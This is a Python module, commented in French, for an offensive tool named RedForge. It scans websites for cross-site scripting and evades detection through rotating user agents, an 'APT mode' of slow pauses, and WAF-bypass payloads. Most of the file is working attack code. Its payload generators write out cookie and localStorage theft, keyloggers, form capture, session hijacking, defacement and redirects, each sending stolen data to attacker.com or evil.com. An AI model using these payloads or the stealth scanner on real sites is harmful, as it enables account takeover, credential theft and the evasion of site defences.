#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module XSS Engine pour RedForge
Détection et exploitation avancée des vulnérabilités XSS
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import hashlib
import requests
import json
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from html import escape, unescape
from bs4 import BeautifulSoup
from collections import defaultdict

@dataclass
class XSSConfig:
    """Configuration avancée pour la détection XSS"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_payloads: Tuple[float, float] = (0.3, 0.8)
    delay_between_params: Tuple[float, float] = (1, 3)
    
    # Comportement
    level: int = 3  # 1-5, niveau d'agressivité
    test_all_params: bool = True
    test_post: bool = True
    test_headers: bool = False
    test_json: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_context_auto: bool = True
    test_polyglots: bool = True
    test_encoding_bypass: bool = True
    detect_waf: bool = True
    analyze_csp: bool = True
    
    # Blind XSS
    collaborator_domain: Optional[str] = None
    blind_xss_timeout: int = 30


class XSSEngine:
    """Moteur avancé de détection et d'exploitation XSS"""
    
    def __init__(self, config: Optional[XSSConfig] = None):
        """
        Initialise le moteur XSS
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or XSSConfig()
        
        # Payloads XSS organisés par catégorie
        self.payloads = {
            "Reflected": [
                "<script>alert('XSS')</script>",
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<iframe src='javascript:alert(\"XSS\")'>",
                "<a href='javascript:alert(\"XSS\")'>click</a>",
                "<div onmouseover='alert(\"XSS\")'>hover</div>",
                "<math href='javascript:alert(1)'>XSS</math>"
            ],
            "DOM Based": [
                "#'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "></script><script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<div onmouseover='alert(\"XSS\")'>test</div>",
                "`-alert(1)-`",
                "${alert(1)}",
                "{{7*7}}"
            ],
            "Stored": [
                "<script>alert('XSS_SAVED')</script>",
                "<img src=x onerror=alert('XSS_SAVED')>",
                "{{7*7}}",
                "${7*7}",
                "<script>fetch('/xss_log?c='+document.cookie)</script>"
            ],
            "Blind": [
                "<script>fetch('http://COLLABORATOR.com/steal?c='+document.cookie)</script>",
                "<img src=x onerror=document.location='http://COLLABORATOR.com/steal?c='+document.cookie>",
                "<svg/onload=fetch('http://COLLABORATOR.com/steal?c='+document.cookie)>",
                "<script>new Image().src='http://COLLABORATOR.com/steal?c='+document.cookie</script>"
            ],
            "Polyglot": [
                "javascript:/*--></script></style></textarea><svg/onload=alert('XSS')>",
                "\"><svg/onload=prompt(1);>",
                "'\"><img/src='x'onerror=alert('XSS')>",
                "<SCRIPT>alert(/XSS/)</SCRIPT>",
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3E"
            ],
            "Encoded": [
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
                "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
                "&lt;script&gt;alert('XSS')&lt;/script&gt;"
            ],
            "Event Handlers": [
                "onclick=alert('XSS')",
                "onmouseover=alert('XSS')",
                "onload=alert('XSS')",
                "onerror=alert('XSS')",
                "onfocus=alert('XSS')",
                "onblur=alert('XSS')",
                "onchange=alert('XSS')",
                "oninput=alert('XSS')",
                "onreset=alert('XSS')",
                "onsearch=alert('XSS')"
            ],
            "WAF Bypass": [
                "<svg/onload=alert`XSS`>",
                "<img/src=x/onerror=alert`XSS`>",
                "<body/onload=alert`XSS`>",
                "<script>alert`XSS`</script>",
                "<ScRiPt>alert`XSS`</ScRiPt>",
                "<svg><script>alert&#40;1&#41;</script>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                "<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"
            ]
        }
        
        # Patterns de contexte
        self.context_patterns = {
            "html": r'<[^>]*%s[^>]*>',
            "attribute": r'=\s*["\'][^"\']*%s[^"\']*["\']',
            "javascript": r'(?:var|let|const)\s+\w+\s*=\s*["\'][^"\']*%s[^"\']*["\']',
            "url": r'(?:href|src|action)\s*=\s*["\'][^"\']*%s[^"\']*["\']',
            "script_block": r'<script[^>]*>.*?%s.*?</script>',
            "style_block": r'<style[^>]*>.*?%s.*?</style>',
            "comment": r'<!--.*?%s.*?-->'
        }
        
        # Signatures WAF
        self.waf_signatures = {
            "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid"],
            "AWS WAF": ["x-amzn-requestid", "aws-waf-token"],
            "ModSecurity": ["Mod_Security", "NOYB"],
            "Akamai": ["X-Akamai-Transformed", "X-Iinfo"],
            "Imperva": ["X-Conditional-Request", "X-Iinfo"],
            "Sucuri": ["X-Sucuri-ID", "X-Sucuri-Cache"]
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.waf_detected = None
        self.rate_limit_hits = 0
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités XSS
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - data: Données POST
                - level: Niveau d'agressivité (1-5)
                - collaborator: Domaine pour blind XSS
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan XSS avancé sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Scan lent et discret")
        
        vulnerabilities = []
        tested_params = set()
        waf_info = None
        
        # Détection WAF
        if self.config.detect_waf:
            waf_info = self._detect_waf(target)
            if waf_info:
                print(f"      🛡️ WAF détecté: {waf_info['name']}")
                if self.config.apt_mode:
                    print(f"      → Adaptation des payloads pour contournement")
        
        # Extraire les paramètres à tester
        params_to_test = self._get_params_to_test(target, kwargs)
        
        # Analyse CSP
        csp_analysis = None
        if self.config.analyze_csp:
            csp_analysis = self._analyze_csp(target)
            if csp_analysis and csp_analysis.get('unsafe_inline') == False:
                print(f"      🔒 CSP détecté - stratégie d'adaptation")
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_params))
            
            # Tester différents types de payloads
            param_vulns = self._test_param_xss(target, param, kwargs, waf_info, csp_analysis)
            vulnerabilities.extend(param_vulns)
            
            if param_vulns:
                self.vulnerabilities_found += len(param_vulns)
                for vuln in param_vulns:
                    print(f"      ✓ XSS détectée: {param} -> {vuln['category']} ({vuln['context']})")
        
        return self._generate_results(target, vulnerabilities, waf_info, csp_analysis)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'level' in kwargs:
            self.config.level = min(5, max(1, kwargs['level']))
        if 'test_all_params' in kwargs:
            self.config.test_all_params = kwargs['test_all_params']
        if 'test_post' in kwargs:
            self.config.test_post = kwargs['test_post']
        if 'collaborator' in kwargs:
            self.config.collaborator_domain = kwargs['collaborator']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.level = min(3, self.config.level)  # Niveau réduit
            self.config.delay_between_params = (5, 15)
            self.config.delay_between_payloads = (2, 5)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _detect_waf(self, target: str) -> Optional[Dict[str, Any]]:
        """Détecte la présence d'un WAF"""
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            for waf_name, signatures in self.waf_signatures.items():
                for sig in signatures:
                    if sig in response.headers or sig.lower() in str(response.headers).lower():
                        return {
                            "name": waf_name,
                            "signature": sig,
                            "confidence": "high"
                        }
            
            # Tester avec un payload déclencheur
            test_payload = "<script>alert('XSS')</script>"
            parsed = urlparse(target)
            query_params = parse_qs(parsed.query)
            query_params['xss_test'] = [test_payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            test_response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            if test_response.status_code == 403 or 'blocked' in test_response.text.lower():
                return {
                    "name": "Unknown WAF",
                    "signature": "blocking_behavior",
                    "confidence": "medium"
                }
                
        except Exception:
            pass
        
        return None
    
    def _analyze_csp(self, target: str) -> Optional[Dict[str, Any]]:
        """Analyse la politique CSP"""
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            csp = response.headers.get('Content-Security-Policy', '')
            if not csp:
                return None
            
            analysis = {
                "present": True,
                "unsafe_inline": "'unsafe-inline'" in csp,
                "unsafe_eval": "'unsafe-eval'" in csp,
                "script_src": re.search(r"script-src\s+([^;]+)", csp),
                "default_src": re.search(r"default-src\s+([^;]+)", csp)
            }
            
            return analysis
            
        except Exception:
            return None
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params and self.config.test_all_params:
            params = self._extract_params(target)
        
        if not params:
            params = ['q', 'search', 's', 'query', 'id', 'page', 'name', 
                     'value', 'callback', 'term', 'keyword', 'input', 'user', 
                     'msg', 'message', 'content', 'comment']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_param_xss(self, target: str, param: str, kwargs: Dict,
                       waf_info: Optional[Dict], csp_analysis: Optional[Dict]) -> List[Dict]:
        """Teste un paramètre pour les vulnérabilités XSS"""
        vulnerabilities = []
        post_data = kwargs.get('data')
        
        # Déterminer les payloads à tester selon le niveau
        all_payloads = []
        for category, payloads in self.payloads.items():
            # Limiter selon le niveau
            max_payloads = self.config.level * 3 if self.config.level < 5 else len(payloads)
            payloads_to_test = payloads[:max_payloads]
            
            # En mode APT, moins de payloads
            if self.config.apt_mode:
                payloads_to_test = payloads_to_test[:5]
            
            all_payloads.extend([(category, p) for p in payloads_to_test])
        
        # Randomiser l'ordre des payloads
        if self.config.random_delays:
            random.shuffle(all_payloads)
        
        for idx, (category, payload) in enumerate(all_payloads):
            # Remplacer collaborator
            if self.config.collaborator_domain and 'COLLABORATOR.com' in payload:
                payload = payload.replace('COLLABORATOR.com', self.config.collaborator_domain)
            
            # Pause entre payloads
            if idx > 0 and self.config.random_delays:
                time.sleep(random.uniform(*self.config.delay_between_payloads))
            
            result = self._test_xss(target, param, payload, post_data)
            self.payloads_tested += 1
            
            if result['vulnerable']:
                context = self._determine_context(result['response'], payload)
                
                vulnerabilities.append({
                    "parameter": param,
                    "payload": payload[:100] + "..." if len(payload) > 100 else payload,
                    "category": category,
                    "type": result['type'],
                    "context": context,
                    "severity": "CRITICAL" if category == "Blind" else "HIGH",
                    "evidence": result['evidence'],
                    "risk_score": 95 if category == "Blind" else 85,
                    "waf_bypass": waf_info is not None
                })
                break  # Arrêter pour ce paramètre si trouvé
        
        return vulnerabilities
    
    def _test_xss(self, target: str, param: str, payload: str,
                  post_data: Optional[str] = None) -> Dict[str, Any]:
        """Teste un payload XSS"""
        result = {
            'vulnerable': False,
            'type': 'unknown',
            'evidence': '',
            'response': ''
        }
        
        try:
            headers = self._get_stealth_headers()
            
            if post_data:
                # Requête POST
                if isinstance(post_data, dict):
                    data_params = post_data.copy()
                else:
                    data_params = parse_qs(post_data) if post_data else {}
                    data_params = {k: v[0] if isinstance(v, list) else v for k, v in data_params.items()}
                
                data_params[param] = payload
                response = requests.post(target, data=data_params, headers=headers,
                                       timeout=10, verify=False)
            else:
                # Requête GET
                parsed = urlparse(target)
                query_params = parse_qs(parsed.query)
                
                query_params[param] = [payload]
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            result['response'] = response.text
            
            # Vérifier la réflexion du payload
            unescaped_text = unescape(response.text)
            
            # Vérifier différentes variations
            variations = [
                payload,
                escape(payload),
                unescape(payload),
                quote(payload),
                unquote(payload)
            ]
            
            for var in variations:
                if var in response.text:
                    result['vulnerable'] = True
                    result['type'] = 'reflected'
                    result['evidence'] = 'payload_reflected'
                    break
            
            # Détection DOM
            dom_patterns = [
                r'document\.write\s*\(\s*["\'][^"\']*' + re.escape(payload[:30]),
                r'innerHTML\s*=\s*["\'][^"\']*' + re.escape(payload[:30]),
                r'eval\s*\(\s*["\'][^"\']*' + re.escape(payload[:30]),
                r'outerHTML\s*=\s*["\'][^"\']*' + re.escape(payload[:30]),
                r'insertAdjacentHTML\s*\(\s*["\'][^"\']*' + re.escape(payload[:30])
            ]
            
            for pattern in dom_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    result['vulnerable'] = True
                    result['type'] = 'dom'
                    result['evidence'] = 'dom_injection'
                    break
                    
        except requests.exceptions.Timeout:
            result['error'] = 'Timeout'
        except Exception as e:
            if not self.config.passive_detection:
                result['error'] = str(e)
        
        return result
    
    def _determine_context(self, response: str, payload: str) -> str:
        """Détermine le contexte d'injection XSS"""
        context = "unknown"
        escaped_payload = re.escape(payload[:50])
        
        for ctx, pattern in self.context_patterns.items():
            if re.search(pattern % escaped_payload, response, re.IGNORECASE | re.DOTALL):
                context = ctx
                break
        
        return context
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict],
                         waf_info: Optional[Dict], csp_analysis: Optional[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        # Compter par catégorie
        category_counts = defaultdict(int)
        context_counts = defaultdict(int)
        severity_counts = defaultdict(int)
        
        for v in vulnerabilities:
            category_counts[v.get('category', 'unknown')] += 1
            context_counts[v.get('context', 'unknown')] += 1
            severity_counts[v.get('severity', 'unknown')] += 1
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "waf_detected": waf_info,
            "csp_analysis": csp_analysis,
            "category_counts": dict(category_counts),
            "context_counts": dict(context_counts),
            "severity_counts": dict(severity_counts),
            "config": {
                "apt_mode": self.config.apt_mode,
                "level": self.config.level,
                "test_all_params": self.config.test_all_params
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities, waf_info, csp_analysis)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité XSS détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_context": {
                "html": len([v for v in vulnerabilities if v['context'] == 'html']),
                "attribute": len([v for v in vulnerabilities if v['context'] == 'attribute']),
                "javascript": len([v for v in vulnerabilities if v['context'] == 'javascript']),
                "url": len([v for v in vulnerabilities if v['context'] == 'url'])
            },
            "critical_count": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict], 
                                  waf_info: Optional[Dict],
                                  csp_analysis: Optional[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Échapper systématiquement les données utilisateur avant insertion HTML")
            recommendations.add("Utiliser des politiques CSP strictes")
            recommendations.add("Mettre en place un Content Security Policy (CSP) avec 'unsafe-inline' désactivé")
        
        if csp_analysis and csp_analysis.get('unsafe_inline'):
            recommendations.add("Désactiver 'unsafe-inline' dans la politique CSP")
        
        if waf_info:
            recommendations.add(f"Configurer le WAF ({waf_info['name']}) avec des règles XSS plus strictes")
        
        recommendations.add("Utiliser des encodeurs contextuels (HTML, JS, URL, CSS)")
        recommendations.add("Implémenter une validation d'entrée côté serveur")
        
        return list(recommendations)
    
    def generate_advanced_payload(self, payload_type: str, context: str, 
                                  custom_domain: str = "attacker.com") -> str:
        """
        Génère des payloads avancés adaptés au contexte
        
        Args:
            payload_type: Type de payload (steal, keylog, deface, redirect, beacon)
            context: Contexte d'injection
            custom_domain: Domaine de l'attaquant
        """
        payloads = {
            "steal": {
                "html": f"<script>fetch('https://{custom_domain}/steal?c='+document.cookie)</script>",
                "attribute": f"\" onmouseover=\"fetch('https://{custom_domain}/steal?c='+document.cookie)\" x=\"",
                "javascript": f"';fetch('https://{custom_domain}/steal?c='+document.cookie);'",
                "url": f"javascript:fetch('https://{custom_domain}/steal?c='+document.cookie)"
            },
            "keylog": {
                "html": f"<script>document.onkeypress=function(e){{fetch('https://{custom_domain}/log?k='+e.key)}}</script>",
                "attribute": f"\" onkeypress=\"fetch('https://{custom_domain}/log?k='+event.key)\" x=\"",
                "javascript": f"';document.onkeypress=function(e){{fetch('https://{custom_domain}/log?k='+e.key)}};'"
            },
            "deface": {
                "html": "<script>document.body.innerHTML='<h1 style=\"color:red\">HACKED BY REDFORGE</h1>'</script>",
                "attribute": "\" onload=\"document.body.innerHTML='<h1 style=\\\"color:red\\\">HACKED BY REDFORGE</h1>'\" x=\""
            },
            "redirect": {
                "html": "<script>window.location='https://evil.com'</script>",
                "attribute": "\" onload=\"window.location='https://evil.com'\" x=\"",
                "url": "javascript:window.location='https://evil.com'"
            },
            "beacon": {
                "html": f"<script>setInterval(()=>{{fetch('https://{custom_domain}/beacon?url='+location.href)}},1000)</script>",
                "attribute": f"\" onload=\"setInterval(()=>{{fetch('https://{custom_domain}/beacon?url='+location.href)}},1000)\" x=\""
            }
        }
        
        return payloads.get(payload_type, {}).get(context, payloads["steal"]["html"])
    
    def generate_exploit_payloads(self) -> List[str]:
        """Génère une liste de payloads d'exploitation complets"""
        exploits = []
        
        # Payload de vol de cookies complet
        exploits.append("""<script>
(function() {
    var data = {
        cookies: document.cookie,
        url: window.location.href,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        timestamp: Date.now()
    };
    
    fetch('https://attacker.com/collect', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data),
        headers: {'Content-Type': 'application/json'}
    });
})();
</script>""")
        
        # Payload keylogger avancé
        exploits.append("""<script>
var buffer = '';
document.addEventListener('keypress', function(e) {
    buffer += e.key;
    if (buffer.length >= 20 || e.key === 'Enter') {
        navigator.sendBeacon('https://attacker.com/log', buffer);
        buffer = '';
    }
});
</script>""")
        
        # Payload de capture de formulaire
        exploits.append("""<script>
document.addEventListener('submit', function(e) {
    var formData = new FormData(e.target);
    var data = {};
    formData.forEach(function(value, key) { data[key] = value; });
    fetch('https://attacker.com/capture', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {'Content-Type': 'application/json'}
    });
});
</script>""")
        
        # Payload de redirection avec délai
        exploits.append("<script>setTimeout(function(){window.location='https://evil.com'},3000)</script>")
        
        # Payload de defacement avancé
        exploits.append("""<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:99999;display:flex;align-items:center;justify-content:center;font-size:48px">HACKED BY REDFORGE</div>';
</script>""")
        
        # Payload de session hijacking
        exploits.append("""<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    fetch('https://attacker.com/hijack?data=' + encodeURIComponent(xhr.responseText));
};
xhr.send();
</script>""")
        
        return exploits
    
    def test_stored_xss(self, target: str, param: str, payload: str, 
                       verify_url: Optional[str] = None) -> Dict[str, Any]:
        """
        Teste spécifiquement les XSS stockés
        
        Args:
            target: URL cible
            param: Paramètre à tester
            payload: Payload XSS
            verify_url: URL pour vérifier le stockage
        """
        result = {
            "vulnerable": False,
            "stored": False,
            "evidence": None,
            "verification": None
        }
        
        # Injecter le payload
        injection_result = self._test_xss(target, param, payload, None)
        
        if injection_result['vulnerable']:
            # Attendre que le payload soit stocké
            time.sleep(3)
            
            # Vérifier si le payload persiste
            verify_target = verify_url or target
            verify_result = self._test_xss(verify_target, param, "", None)
            
            if payload in verify_result['response']:
                result["vulnerable"] = True
                result["stored"] = True
                result["evidence"] = "payload_persists"
                result["verification"] = verify_target
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "waf_detected": self.waf_detected is not None,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    engine = XSSEngine()
    results = engine.scan("https://example.com/search?q=test")
    print(f"XSS détectées: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = XSSConfig(apt_mode=True, level=3, passive_detection=True)
    engine_apt = XSSEngine(config=apt_config)
    results_apt = engine_apt.scan("https://example.com/search?q=test", apt_mode=True)
    print(f"XSS détectées (APT): {results_apt['count']}")
    
    # Générer payloads d'exploitation
    exploits = engine_apt.generate_exploit_payloads()
    print(f"\nPayloads d'exploitation générés: {len(exploits)}")
    
    # Générer payload avancé
    advanced_payload = engine_apt.generate_advanced_payload("steal", "html", "evil.com")
    print(f"Payload avancé: {advanced_payload[:100]}...")